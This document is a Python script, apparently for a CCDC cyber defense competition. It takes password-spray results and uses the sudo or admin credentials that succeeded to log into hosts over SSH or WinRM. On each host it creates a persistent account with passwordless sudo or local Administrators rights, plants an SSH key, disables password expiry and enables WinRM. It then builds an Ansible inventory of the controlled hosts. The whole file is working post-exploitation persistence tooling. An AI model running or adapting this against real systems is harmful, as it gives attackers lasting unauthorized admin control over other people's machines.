#!/usr/bin/env python3
"""
persist.py -- CCDC post-spray persistence & inventory generation

Usage:
  python3 scripts/persist.py --username svc --password 'P@ss!' --sshpassword keypass
  python3 scripts/persist.py --username svc --password 'P@ss!' --sshpassword keypass \
      --recon-dir output/...

Reads spray results from output/spray*/results.txt (auto-discovered).
Parses recon data for host metadata.
Creates service accounts, deploys SSH keys, generates Ansible inventory.
"""

import argparse
import os
import re
import subprocess
import sys
import threading
import xml.etree.ElementTree as ET
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

LOCK = threading.Lock()
OUTPUT_DIR = Path(__file__).resolve().parent.parent / "output"
INVENTORY_DIR = Path(__file__).resolve().parent.parent / "inventory"
KEY_DIR = Path(__file__).resolve().parent.parent / ".ssh"


def log(msg: str):
    with LOCK:
        print(msg, flush=True)


def die(msg: str):
    print(f"[ERROR] {msg}", file=sys.stderr)
    sys.exit(1)


def _chown_to_invoker(path: Path):
    """Chown a path to the real (non-root) user who invoked sudo."""
    uid, gid = os.environ.get("SUDO_UID"), os.environ.get("SUDO_GID")
    if uid is None or gid is None:
        return
    try:
        os.chown(path, int(uid), int(gid))
    except OSError:
        pass


def _classify_os(name: str) -> str:
    low = name.lower()
    if "windows" in low:
        return "windows"
    nix = (
        "linux",
        "ubuntu",
        "debian",
        "centos",
        "fedora",
        "rhel",
        "rocky",
        "freebsd",
        "unix",
    )
    if any(k in low for k in nix):
        return "linux"
    return "unknown"


def _sort_ips(ips):
    return sorted(ips, key=lambda ip: tuple(int(o) for o in ip.split(".")))


# -- Spray results parser -----------------------------------------------------


def _find_spray_dirs() -> list[Path]:
    """Auto-discover spray result directories, newest first."""
    dirs = sorted(OUTPUT_DIR.glob("spray_*"), reverse=True)
    return [d for d in dirs if (d / "results.txt").is_file()]


def parse_spray_results(spray_dir: Path | None = None) -> dict[str, dict]:
    """Parse spray results.txt, return only sudo/admin entries.

    Returns {ip: {"user": str, "password": str, "platform": str,
                   "os_info": str, "priv": str}}
    Only one cred per IP (first sudo/admin entry wins).
    """
    if spray_dir:
        results_files = [spray_dir / "results.txt"]
    else:
        results_files = [d / "results.txt" for d in _find_spray_dirs()]

    if not results_files:
        die("No spray results found in output/spray*/results.txt")

    # Regex for the entry line (indented under an IP header)
    # Format: "  user,password (success, platform [os_info], sudo|admin)"
    entry_re = re.compile(
        r"^\s+"
        r"(?P<user>[^,]+),(?P<password>[^(]+?)\s*"
        r"\(success"
        r"(?:,\s*(?P<platform>\w+)"
        r"(?:\s*\[(?P<os_info>[^\]]*)\])?)?"
        r"(?:,\s*(?P<priv>sudo|admin))?"
        r"\)",
    )
    ip_re = re.compile(r"^(\d{1,3}(?:\.\d{1,3}){3})\s*$")

    targets: dict[str, dict] = {}
    for results_file in results_files:
        if not results_file.is_file():
            log(f"  [!] {results_file} not found, skipping")
            continue
        log(f"  [*] Parsing {results_file}")
        current_ip = ""
        for line in results_file.read_text().splitlines():
            ip_m = ip_re.match(line)
            if ip_m:
                current_ip = ip_m.group(1)
                continue
            entry_m = entry_re.match(line)
            if entry_m and current_ip:
                priv = entry_m.group("priv")
                if not priv:
                    continue  # skip non-privileged entries
                if current_ip in targets:
                    continue  # first privileged cred wins
                targets[current_ip] = {
                    "user": entry_m.group("user").strip(),
                    "password": entry_m.group("password").strip(),
                    "platform": entry_m.group("platform") or "linux",
                    "os_info": entry_m.group("os_info") or "unknown",
                    "priv": priv,
                }

    return targets


# -- Recon / nmap parser -------------------------------------------------------


def _find_latest_recon_dir() -> Path | None:
    """Find the most recent recon output directory."""
    dirs = sorted(
        (
            d
            for d in OUTPUT_DIR.iterdir()
            if d.is_dir() and not d.name.startswith("spray")
        ),
        reverse=True,
    )
    return dirs[0] if dirs else None


def _parse_nmap_xml(xml_path: Path) -> list[dict]:
    """Parse a single nmap XML file into host dicts (mirrors recon.py)."""
    try:
        root = ET.parse(xml_path).getroot()
    except ET.ParseError as e:
        log(f"  [!] XML parse error {xml_path.name}: {e}")
        return []
    hosts = []
    for host_el in root.findall("host"):
        status = host_el.find("status")
        if status is None or status.get("state") != "up":
            continue
        ip = next(
            (
                a.get("addr")
                for a in host_el.findall("address")
                if a.get("addrtype") == "ipv4"
            ),
            "",
        )
        if not ip:
            continue
        hn_el = host_el.find(".//hostname")
        hostname = hn_el.get("name", "") if hn_el is not None else ""
        services = []
        for port_el in host_el.findall(".//port"):
            st = port_el.find("state")
            if st is None or st.get("state") != "open":
                continue
            svc = port_el.find("service")
            services.append(
                {
                    "port": int(port_el.get("portid", 0)),
                    "proto": port_el.get("protocol", "tcp"),
                    "name": svc.get("name", "") if svc is not None else "",
                    "product": svc.get("product", "") if svc is not None else "",
                    "version": svc.get("version", "") if svc is not None else "",
                }
            )
        os_str, os_family = "Unknown", "unknown"
        os_el = host_el.find("os")
        if os_el is not None:
            matches = os_el.findall("osmatch")
            if matches:
                best = max(matches, key=lambda x: int(x.get("accuracy", 0)))
                os_str = f"{best.get('name')} ({best.get('accuracy')}%)"
                os_family = _classify_os(best.get("name", ""))
        hosts.append(
            {
                "ip": ip,
                "hostname": hostname,
                "os": os_str,
                "os_family": os_family,
                "ports": sorted(s["port"] for s in services),
                "services": services,
            }
        )
    return hosts


def parse_recon_data(recon_dir: Path) -> dict[str, dict]:
    """Parse nmap XML files from a recon dir. Returns {ip: host_dict}.

    Tries raw/nmap_svc_*.xml first, falls back to nmap_*.xml (older layout).
    """
    xml_files = sorted(recon_dir.glob("raw/nmap_svc_*.xml"))
    if not xml_files:
        xml_files = sorted(recon_dir.glob("nmap_*.xml"))
    if not xml_files:
        log(f"  [!] No nmap XML files found in {recon_dir}")
        return {}

    hosts_by_ip: dict[str, dict] = {}
    for xml_file in xml_files:
        for host in _parse_nmap_xml(xml_file):
            ip = host["ip"]
            if ip not in hosts_by_ip:
                hosts_by_ip[ip] = host
            else:
                # Merge: keep richer data
                existing = hosts_by_ip[ip]
                if not existing["hostname"] and host["hostname"]:
                    existing["hostname"] = host["hostname"]
                if existing["os"] == "Unknown" and host["os"] != "Unknown":
                    existing["os"] = host["os"]
                    existing["os_family"] = host["os_family"]
                existing_ports = set(existing["ports"])
                for svc in host["services"]:
                    if svc["port"] not in existing_ports:
                        existing["services"].append(svc)
                        existing["ports"] = sorted(
                            s["port"] for s in existing["services"]
                        )

    log(f"  [+] Parsed {len(hosts_by_ip)} hosts from {len(xml_files)} XML files")
    return hosts_by_ip


# -- SSH keygen ----------------------------------------------------------------


def generate_ssh_keypair(passphrase: str) -> tuple[Path, Path]:
    """Generate an ed25519 SSH keypair. Returns (private_key_path, public_key_path)."""
    KEY_DIR.mkdir(parents=True, exist_ok=True)
    priv_key = KEY_DIR / "id_ed25519"
    pub_key = KEY_DIR / "id_ed25519.pub"

    if priv_key.exists() and pub_key.exists():
        log(f"  [*] SSH keypair already exists at {priv_key}")
        return priv_key, pub_key

    # Remove stale key if only one half exists
    for p in (priv_key, pub_key):
        if p.exists():
            p.unlink()

    cmd = [
        "ssh-keygen",
        "-t",
        "ed25519",
        "-f",
        str(priv_key),
        "-N",
        passphrase,
        "-C",
        "ccdc-service-account",
        "-q",
    ]
    try:
        subprocess.run(cmd, check=True, capture_output=True, timeout=30)
    except subprocess.CalledProcessError as e:
        die(f"ssh-keygen failed: {e.stderr.decode(errors='replace').strip()}")
    except FileNotFoundError:
        die("ssh-keygen not found")

    # Fix ownership if running under sudo
    for p in (KEY_DIR, priv_key, pub_key):
        _chown_to_invoker(p)

    log(f"  [+] Generated SSH keypair: {priv_key}")
    return priv_key, pub_key


# -- Persistence (paramiko) ----------------------------------------------------


def _ssh_exec(client, cmd: str) -> tuple[str, str, int]:
    """Run a command over SSH. Returns (stdout, stderr, exit_status)."""
    _, out, err = client.exec_command(cmd, timeout=15)
    exit_status = out.channel.recv_exit_status()
    return (
        out.read().decode(errors="replace"),
        err.read().decode(errors="replace"),
        exit_status,
    )


def deploy_persistence(
    ip: str,
    spray_cred: dict,
    new_user: str,
    new_pass: str,
    pub_key_text: str,
    ssh_port: int = 22,
) -> dict:
    """SSH into a host with sprayed creds, create user, deploy key.

    Returns {"ip": str, "success": bool, "message": str}.
    """
    import paramiko

    result = {"ip": ip, "success": False, "message": ""}
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(
            ip,
            port=ssh_port,
            username=spray_cred["user"],
            password=spray_cred["password"],
            timeout=10,
            auth_timeout=10,
            banner_timeout=10,
            look_for_keys=False,
            allow_agent=False,
        )
    except Exception as e:
        result["message"] = f"SSH connect failed: {e}"
        return result

    try:
        sudo_prefix = ""
        if spray_cred["user"] != "root":
            sudo_prefix = f"echo '{spray_cred['password']}' | sudo -S "

        # 1. Create user (ignore error if exists)
        stdout, stderr, rc = _ssh_exec(
            client,
            f"{sudo_prefix}useradd -m -s /bin/bash {new_user} 2>&1 || true",
        )

        # 2. Set password
        stdout, stderr, rc = _ssh_exec(
            client,
            f"{sudo_prefix}bash -c \"echo '{new_user}:{new_pass}' | chpasswd\"",
        )
        if rc != 0:
            result["message"] = f"chpasswd failed (rc={rc}): {stderr.strip()}"
            return result

        # 3. Grant sudo -- try both methods
        # Method A: add to sudo group
        _ssh_exec(
            client,
            f"{sudo_prefix}usermod -aG sudo {new_user} 2>/dev/null || true",
        )
        # Method B: sudoers.d file (works on distros without sudo group)
        _ssh_exec(
            client,
            f"{sudo_prefix}bash -c '"
            f'echo "{new_user} ALL=(ALL) NOPASSWD:ALL" '
            f"> /etc/sudoers.d/{new_user} && "
            f"chmod 440 /etc/sudoers.d/{new_user}'",
        )

        # 4. Deploy SSH key
        home_dir = f"/home/{new_user}"
        if new_user == "root":
            home_dir = "/root"

        ssh_dir = f"{home_dir}/.ssh"
        auth_keys = f"{ssh_dir}/authorized_keys"
        commands = [
            f"{sudo_prefix}mkdir -p {ssh_dir}",
            f"{sudo_prefix}bash -c 'echo \"{pub_key_text}\" >> {auth_keys}'",
            f"{sudo_prefix}chown -R {new_user}:{new_user} {ssh_dir}",
            f"{sudo_prefix}chmod 700 {ssh_dir}",
            f"{sudo_prefix}chmod 600 {auth_keys}",
        ]
        for cmd in commands:
            stdout, stderr, rc = _ssh_exec(client, cmd)
            if rc != 0:
                result["message"] = f"Key deploy failed at '{cmd}': {stderr.strip()}"
                return result

        result["success"] = True
        result["message"] = "OK"
    except Exception as e:
        result["message"] = f"Persistence failed: {e}"
    finally:
        try:
            client.close()
        except Exception:
            pass

    return result


# -- Persistence (WinRM) ------------------------------------------------------


def deploy_persistence_winrm(
    ip: str,
    spray_cred: dict,
    new_user: str,
    new_pass: str,
    winrm_port: int = 5985,
) -> dict:
    """WinRM into a Windows host with sprayed creds, create local admin.

    Returns {"ip": str, "success": bool, "message": str}.
    """
    try:
        import winrm
    except ImportError:
        return {"ip": ip, "success": False, "message": "pywinrm not installed"}

    result = {"ip": ip, "success": False, "message": ""}

    try:
        session = winrm.Session(
            f"http://{ip}:{winrm_port}/wsman",
            auth=(spray_cred["user"], spray_cred["password"]),
            transport="ntlm",
            server_cert_validation="ignore",
            operation_timeout_sec=15,
            read_timeout_sec=20,
        )

        # Verify connectivity
        r = session.run_cmd("whoami")
        if r.status_code != 0:
            result["message"] = f"WinRM auth failed (rc={r.status_code})"
            return result

        # 1. Create user (ignore error if exists)
        r = session.run_cmd(f"net user {new_user} {new_pass} /add /y")
        # Error code 2 = "already exists", which is fine
        if r.status_code != 0:
            err_out = r.std_err.decode(errors="replace").strip()
            if "already exists" not in err_out.lower():
                result["message"] = (
                    f"net user /add failed (rc={r.status_code}): {err_out}"
                )
                return result

        # 2. Set password (in case user already existed with different pass)
        session.run_cmd(f"net user {new_user} {new_pass}")

        # 3. Add to Administrators group
        r = session.run_cmd(f"net localgroup Administrators {new_user} /add")
        if r.status_code != 0:
            err_out = r.std_err.decode(errors="replace").strip()
            if "already a member" not in err_out.lower():
                result["message"] = (
                    f"net localgroup failed (rc={r.status_code}): {err_out}"
                )
                return result

        # 4. Ensure the account is active and password never expires
        session.run_cmd(f"net user {new_user} /active:yes")
        session.run_cmd(
            f"wmic useraccount where \"Name='{new_user}'\" set PasswordExpires=FALSE"
        )

        # 5. Enable WinRM for future Ansible connections (idempotent)
        session.run_cmd("winrm quickconfig -quiet")

        result["success"] = True
        result["message"] = "OK"

    except Exception as e:
        err = str(e).lower()
        if "401" in err or "unauthorized" in err:
            result["message"] = f"WinRM auth rejected: {e}"
        elif any(x in err for x in ("timed out", "refused", "unreachable")):
            result["message"] = f"WinRM connection error: {e}"
        else:
            result["message"] = f"WinRM persistence failed: {e}"

    return result


# -- Inventory generation ------------------------------------------------------

# Service port -> role group name
SERVICE_ROLES: dict[int, str] = {
    22: "ssh_servers",
    53: "dns_servers",
    80: "web_servers",
    443: "web_servers",
    3128: "proxy_servers",
    8080: "web_servers",
    8443: "web_servers",
    9001: "tor_nodes",
    111: "rpc_servers",
    445: "smb_servers",
    139: "smb_servers",
    3389: "rdp_servers",
    5985: "winrm_servers",
    515: "print_servers",
    631: "print_servers",
    9100: "print_servers",
    5000: "upnp_servers",
}


def _detect_distro(os_info: str, nmap_os: str) -> str:
    """Extract distro name from spray os_info or nmap OS string."""
    combined = f"{os_info} {nmap_os}".lower()
    for distro in ("debian", "ubuntu", "centos", "fedora", "rhel", "rocky", "arch"):
        if distro in combined:
            return distro
    if "windows" in combined:
        return "windows"
    return "other"


def _yaml_val(s: str) -> str:
    """Quote a string for safe YAML values."""
    if not s:
        return "''"
    needs_quote = any(c in s for c in ":#{}[]|>&*!?,")
    needs_quote = needs_quote or s.startswith(("'", '"'))
    if needs_quote:
        escaped = s.replace("'", "''")
        return f"'{escaped}'"
    return s


def generate_inventory(
    succeeded_ips: list[str],
    recon_hosts: dict[str, dict],
    spray_targets: dict[str, dict],
    new_user: str,
    new_pass: str,
    key_path: Path,
) -> Path:
    """Generate inventory/hosts.yml. Returns the output path."""
    INVENTORY_DIR.mkdir(parents=True, exist_ok=True)
    out_path = INVENTORY_DIR / "hosts.yml"

    # Build per-host metadata
    host_meta: dict[str, dict] = {}
    for ip in _sort_ips(succeeded_ips):
        recon = recon_hosts.get(ip, {})
        spray = spray_targets.get(ip, {})
        platform = spray.get("platform", "linux")
        os_family = recon.get("os_family", "unknown")
        # Trust spray platform over nmap OS classification
        if platform == "windows":
            os_family = "windows"
        os_info = spray.get("os_info", "")
        nmap_os = recon.get("os", "")
        distro = _detect_distro(os_info, nmap_os)
        ports = recon.get("ports", [])
        hostname = recon.get("hostname", "")
        roles = sorted({SERVICE_ROLES[p] for p in ports if p in SERVICE_ROLES})

        # Find SSH port (prefer recon data)
        ssh_port = 22
        for svc in recon.get("services", []):
            if svc.get("name") == "ssh":
                ssh_port = svc["port"]
                break

        # Find WinRM port
        winrm_port = 5985
        for svc in recon.get("services", []):
            if svc.get("port") in (5985, 5986):
                winrm_port = svc["port"]
                break

        host_meta[ip] = {
            "platform": platform,
            "os_family": os_family,
            "distro": distro,
            "roles": roles,
            "hostname": hostname,
            "ssh_port": ssh_port,
            "winrm_port": winrm_port,
            "ports": ports,
            "nmap_os": nmap_os,
            "os_info": os_info,
        }

    # Build group memberships
    os_groups: dict[str, list[str]] = {}
    distro_groups: dict[str, list[str]] = {}
    role_groups: dict[str, list[str]] = {}
    for ip, meta in host_meta.items():
        os_groups.setdefault(meta["os_family"], []).append(ip)
        distro_groups.setdefault(meta["distro"], []).append(ip)
        for role in meta["roles"]:
            role_groups.setdefault(role, []).append(ip)

    # Write YAML by hand (no PyYAML dependency needed)
    lines: list[str] = ["---", "all:"]
    lines.append("  vars:")
    lines.append(f"    ansible_user: {new_user}")
    lines.append(f"    ansible_ssh_private_key_file: {key_path}")
    lines.append("    ansible_ssh_common_args: >-")
    lines.append("      -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null")
    lines.append("  hosts:")

    for ip in _sort_ips(succeeded_ips):
        meta = host_meta[ip]
        lines.append(f"    {ip}:")
        if meta["platform"] == "windows":
            # Windows: WinRM connection overrides
            lines.append("      ansible_connection: winrm")
            lines.append("      ansible_winrm_transport: ntlm")
            lines.append("      ansible_winrm_server_cert_validation: ignore")
            lines.append(f"      ansible_password: {_yaml_val(new_pass)}")
            if meta["winrm_port"] != 5985:
                lines.append(f"      ansible_port: {meta['winrm_port']}")
            if meta["winrm_port"] == 5986:
                lines.append("      ansible_winrm_scheme: https")
        else:
            # Linux: SSH (uses global vars; only override non-standard port)
            if meta["ssh_port"] != 22:
                lines.append(f"      ansible_port: {meta['ssh_port']}")
        if meta["hostname"]:
            lines.append(f"      hostname: {_yaml_val(meta['hostname'])}")
        if meta["nmap_os"] and meta["nmap_os"] != "Unknown":
            lines.append(f"      nmap_os: {_yaml_val(meta['nmap_os'])}")
        if meta["os_info"] and meta["os_info"] != "unknown":
            lines.append(f"      os_info: {_yaml_val(meta['os_info'])}")
        if meta["ports"]:
            port_str = ", ".join(str(p) for p in meta["ports"])
            lines.append(f"      open_ports: [{port_str}]")

    lines.append("  children:")

    # OS family groups
    for family in ("linux", "windows", "unknown"):
        ips = os_groups.get(family, [])
        if ips:
            lines.append(f"    {family}:")
            if family == "windows":
                # Group-level vars for Windows hosts
                lines.append("      vars:")
                lines.append("        ansible_connection: winrm")
                lines.append("        ansible_winrm_transport: ntlm")
                lines.append("        ansible_winrm_server_cert_validation: ignore")
                lines.append(f"        ansible_password: {_yaml_val(new_pass)}")
            lines.append("      hosts:")
            for ip in _sort_ips(ips):
                lines.append(f"        {ip}: {{}}")

    # Distro groups
    for distro in sorted(distro_groups):
        if distro == "other":
            continue
        ips = distro_groups[distro]
        lines.append(f"    {distro}:")
        lines.append("      hosts:")
        for ip in _sort_ips(ips):
            lines.append(f"        {ip}: {{}}")

    # Role groups
    for role in sorted(role_groups):
        ips = role_groups[role]
        lines.append(f"    {role}:")
        lines.append("      hosts:")
        for ip in _sort_ips(ips):
            lines.append(f"        {ip}: {{}}")

    out_path.write_text("\n".join(lines) + "\n")
    _chown_to_invoker(out_path)
    _chown_to_invoker(INVENTORY_DIR)
    log(f"  [READY] {out_path}")
    return out_path


# -- Main ----------------------------------------------------------------------


def main():
    parser = argparse.ArgumentParser(
        description="CCDC post-spray persistence & Ansible inventory generation",
    )
    parser.add_argument(
        "--username",
        required=True,
        help="Username for the new service account",
    )
    parser.add_argument(
        "--password",
        required=True,
        help="Password for the new service account",
    )
    parser.add_argument(
        "--sshpassword",
        required=True,
        help="Passphrase for the SSH keypair",
    )
    parser.add_argument(
        "--recon-dir",
        help="Recon output dir (e.g. output/20260312_235815)",
    )
    parser.add_argument(
        "--spray-dir",
        help="Spray output dir (default: auto-discover output/spray*)",
    )
    parser.add_argument(
        "--workers",
        type=int,
        default=10,
        help="Parallel SSH workers (default: 10)",
    )
    args = parser.parse_args()

    log("[*] persist.py -- CCDC post-spray persistence")
    log(f"[*] Service account: {args.username}")

    # Phase 1: Parse spray results
    log("\n[*] Phase 1 -- Parse spray results")
    spray_dir = Path(args.spray_dir) if args.spray_dir else None
    spray_targets = parse_spray_results(spray_dir)
    if not spray_targets:
        die("No sudo/admin credentials found in spray results")
    for ip, cred in spray_targets.items():
        log(f"  [+] {ip} -- {cred['user']} ({cred['priv']}, {cred['os_info']})")
    log(f"  {len(spray_targets)} host(s) with sudo/admin access")

    # Phase 2: Parse recon data
    log("\n[*] Phase 2 -- Parse recon data")
    if args.recon_dir:
        recon_dir = Path(args.recon_dir)
    else:
        recon_dir = _find_latest_recon_dir()
    recon_hosts: dict[str, dict] = {}
    if recon_dir:
        log(f"  [*] Using recon data from {recon_dir}")
        recon_hosts = parse_recon_data(recon_dir)
    else:
        log("  [!] No recon directory found, inventory will have minimal metadata")

    # Determine SSH / WinRM ports for each target from recon data
    target_ssh_ports: dict[str, int] = {}
    target_winrm_ports: dict[str, int] = {}
    for ip in spray_targets:
        ssh_port = 22
        winrm_port = 5985
        if ip in recon_hosts:
            for svc in recon_hosts[ip].get("services", []):
                if svc.get("name") == "ssh":
                    ssh_port = svc["port"]
                if svc.get("port") in (5985, 5986):
                    winrm_port = svc["port"]
        target_ssh_ports[ip] = ssh_port
        target_winrm_ports[ip] = winrm_port

    # Phase 3: Generate SSH keypair
    log("\n[*] Phase 3 -- Generate SSH keypair")
    priv_key, pub_key = generate_ssh_keypair(args.sshpassword)
    pub_key_text = pub_key.read_text().strip()

    # Phase 4: Deploy persistence (parallel)
    linux_ips = [ip for ip, c in spray_targets.items() if c["platform"] != "windows"]
    win_ips = [ip for ip, c in spray_targets.items() if c["platform"] == "windows"]
    log(
        f"\n[*] Phase 4 -- Deploy persistence "
        f"({len(linux_ips)} linux, {len(win_ips)} windows)"
    )
    succeeded: list[str] = []
    failed: list[str] = []
    total = len(spray_targets)
    counter = {"n": 0}
    counter_lock = threading.Lock()

    def _do_host(ip: str) -> dict:
        cred = spray_targets[ip]
        if cred["platform"] == "windows":
            result = deploy_persistence_winrm(
                ip=ip,
                spray_cred=cred,
                new_user=args.username,
                new_pass=args.password,
                winrm_port=target_winrm_ports.get(ip, 5985),
            )
        else:
            result = deploy_persistence(
                ip=ip,
                spray_cred=cred,
                new_user=args.username,
                new_pass=args.password,
                pub_key_text=pub_key_text,
                ssh_port=target_ssh_ports.get(ip, 22),
            )
        with counter_lock:
            counter["n"] += 1
            n = counter["n"]
        plat = "win" if cred["platform"] == "windows" else "lnx"
        tag = "[+]" if result["success"] else "[!]"
        log(f"  {tag} [{n}/{total}] {ip} ({plat}) -- {result['message']}")
        return result

    workers = min(args.workers, total)
    with ThreadPoolExecutor(max_workers=workers) as pool:
        futures = {pool.submit(_do_host, ip): ip for ip in spray_targets}
        for fut in as_completed(futures):
            try:
                result = fut.result()
                if result["success"]:
                    succeeded.append(result["ip"])
                else:
                    failed.append(result["ip"])
            except Exception as e:
                ip = futures[fut]
                log(f"  [!] {ip} -- unexpected error: {e}")
                failed.append(ip)

    log(f"\n  Persistence: {len(succeeded)}/{total} succeeded, {len(failed)} failed")

    # Phase 5: Generate Ansible inventory
    log("\n[*] Phase 5 -- Generate Ansible inventory")
    if succeeded:
        inv_path = generate_inventory(
            succeeded_ips=succeeded,
            recon_hosts=recon_hosts,
            spray_targets=spray_targets,
            new_user=args.username,
            new_pass=args.password,
            key_path=priv_key,
        )
    else:
        log("  [!] No hosts succeeded -- skipping inventory generation")
        inv_path = None

    # Summary
    div = "=" * 60
    log(f"\n{div}")
    log(f"  Persistence: {len(succeeded)}/{total} hosts")
    log(f"  SSH key:     {priv_key}")
    if inv_path:
        log(f"  Inventory:   {inv_path}")
    if failed:
        log(f"  Failed:      {', '.join(_sort_ips(failed))}")
    log(div)


if __name__ == "__main__":
    main()
